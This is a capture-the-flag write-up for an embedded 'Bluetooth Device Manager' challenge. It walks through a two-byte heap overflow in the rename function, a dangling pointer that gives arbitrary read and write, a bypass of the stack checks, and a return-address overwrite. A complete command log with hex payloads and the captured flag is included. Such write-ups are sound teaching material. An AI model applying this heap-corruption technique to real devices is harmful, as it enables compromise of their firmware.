# Bluetooth Device Manager
You have a basic car model and would like to enable some extra features? That navigation with traffic should be neat. Right. It is expensive, you know. Or not, if you can access the control interface. Try bluetooth this time. We think, it could be used for purposes other than making calls and playing MP3s.

## Write-up
This challenge has a console to create, edit and delete bluetooth devices. We will need exploit it to get the flag. 

1.  We found the string **such heap, much pr0!** and the function to print the flag at address 0182

2.  Analyzing the code to create, edit and delete objects we find one bug... The code to rename a device doesn't reallocate space and it doesn't check the length correctly. The new name can be 2 bytes larger than the previous name so we can overwrite the termination 00 of previous string and the length of next heap chunk.
    
3. Test bug...
   1. Create a device
   2. Edit the device changing sending the larger name
   3. Print the device
```
Log:
2
bbbbb
aaaaa
4
0
bbbbbac (don't ask key)
1

Output:
0. name: bbbbbac, key: 
```

4. Exploit the bug...
   1 - Create two devices (#0 and #1)
   2 - Rename device #0 and use the bug to replace the length of the key chunk. We need add to this length, the length of the complete device #1
   3 - Delete device #0... As the key chunk has a modified length, and it matches with the end of used heap, it will think that the heap is empty after the deletion. But the pointer to device #1 remains set 
   4 - Create a third device (#2) with the correct lengths to overwrite the position of the pointers of device #1 
   5 - Printing and renaming device #1 we can read and write any addresses  
	
5. We need overwrite the stack to set the return address to 0182 (the address of print flag function). But we have to bypass 4 security measures before
   1. SP points to different address each execution
   2. Values at 2000:2001 must be 0DF0
   3. SP must match the values at 2192:2193
   4. Values at 2002:2003 must be ADBA

6. Solutions...  
   1. We can read address 2192:2193 to see where is pointing the SP (the value read minus 2)
   2. We can write it, no problem
   3. We can jump to 0185 instead 0182 to avoid three push and pass this check
   4. We can write it, no problem, but we have to be careful to not corrupt the USART0 pointer at 2004:2005
	
7. Do all the steps carefully and get the flag
```
COMPLETE LOG OF COMMANDS:
(Create device 0)
2
12345
12345

(Create device 1)
2
12345
12345

(Rename device 0 to overwrite key chunk length with value 0x23)
4
0
123456#23xx

(Delete device 0)
3
0

(Create device 2 with special key to set pointer to 2192)
2
12345
123456#0B#01#01#06#01#06#01#92#21#AE#3F#00

(Print device to see values at 2192)
1 
(
Result:
31 0A 31 2E 20 6E 61 6D 65 3A 20 1B 3F 03 31 2E 20 6E 61 6D 65 3A 20 1B 3F 03 31 2E 20 6E 61 6D
65 3A 20 1B 3F 03 2C 20 6B 65 79 3A 20 41 22 2E 04 65 6C 03 0A 32 2E 20 6E 61 6D 65 3A 20 31 32
-> We will have to overwrite 3F1B - 2 = 3F19
)

(Edit device 2 to set pointers to 1FFF(to overwrite 200x values) and 3F19(to overwrite return address))
4
2
12345
123456#0B#01#01#06#01#06#01#FF#1F#19#3F#00

(Edit device 1 to write data to 200x and SP)
4
1
#01#0D#F0#AD#BA#A0#08                          <- Set 0DF0ADBA and maintain the pointer to USART0 (08A0)
#01#85                                         <- Overwrite return address

such heap, much pr0!
Your flag: a1b51ac1c17b930ef189cea65688c964
```